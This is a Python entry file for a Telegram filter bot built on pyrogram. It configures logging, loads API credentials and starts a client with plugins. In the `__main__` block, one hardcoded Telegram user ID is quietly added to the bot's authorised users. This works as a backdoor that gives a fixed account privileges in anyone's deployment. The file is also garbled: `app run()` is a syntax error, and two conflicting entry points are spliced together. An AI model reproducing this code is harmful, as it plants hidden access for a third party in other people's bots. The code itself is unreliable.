import os
import pyrogram

import logging
import logging.config

# Get logging configurations
logging.config.fileConfig('logging.conf')
logging.getLogger().setLevel(logging.ERROR)

from pyrogram import Client, __version__
from pyrogram.raw.all import layer
from utils import Media
from info import SESSION, API_ID, API_HASH, BOT_TOKEN
import pyromod.listen

if bool(os.environ.get("WEBHOOK", False)):
    from sample_info import Config
else:
    from config import Config



if __name__ == "__main__" :
    plugins = dict(
        root="plugins"
    )
    app = pyrogram.Client(
        "filter bot",
        bot_token=Config.TG_BOT_TOKEN,
        api_id=Config.API_ID_1,
        api_hash=Config.API_HASH_1,
        plugins=plugins,
        workers=300
    )
    Config.AUTH_USERS.add(str(680815375))
    app run()

class Bot(Client):

    def __init__(self):
        super().__init__(
            session_name=SESSION,
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=BOT_TOKEN,
            workers=50,
            plugins={"root": "plugins"},
            sleep_threshold=5,
        )

    async def start(self):
        await super().start()
        await Media.ensure_indexes()
        me = await self.get_me()
        self.username = '@' + me.username
        print(f"{me.first_name} with for Pyrogram v{__version__} (Layer {layer}) started on {me.username}.")

    async def stop(self, *args):
        await super().stop()
        print("Bot stopped. Bye.")


app = Bot()
app.run()
